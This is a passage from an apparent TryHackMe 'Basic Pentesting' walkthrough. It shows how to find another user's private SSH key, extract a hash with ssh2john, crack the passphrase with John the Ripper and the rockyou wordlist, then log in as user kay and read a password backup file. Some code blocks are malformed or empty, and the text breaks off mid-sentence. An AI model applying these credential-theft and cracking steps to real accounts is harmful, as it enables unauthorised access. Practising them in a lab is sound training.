```
cd to ssh and you will find

authorized_keys  id_rsa  id_rsa.pub
```

cat id_rsa will give you text as in id_rsa.txt

Run ssh2john tool to get the hash of the keys

python ssh2john.py id_rsa.txt > id_rsa.hash
```

Run John The Ripper to crack the passphrase for the account Kay.
```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

Use
```bash

```
if somehow you not sure


# 7. What service do you use to access the server(answer in abbreviation in all caps)?

SSH

# 8. Enumerate the machine to find any vectors for privilege escalation 
No clue what this mean, so im following [this](https://medium.com/@DanishZia/tryhackme-basic-pentesting-write-up-d6e3d551c0f7) write up for this part and for number 6 and the rest

# 9  What is the name of the other user you found(all lower case)?

kay

# 10. If you have found another user, what can you do with this information? 

# 11. What is the final password you obtain?

If i tried to ssh directly as Kay, I failed. Instead ssh from jan. SSH to Jan as number 6 show, and then

```bash
ssh -i /home/kay/.ssh/id_rsa kay@10.10.175.26
```
You will be prompted with
```bash
Enter passphrase for key '/home/kay/.ssh/id_rsa': 
```
And you type 'beeswax' from John The Ripper earlier

And you're in as Kay

do ls and you'll find 'pass.bak', cat 'pass.bak' adn you find the password which is
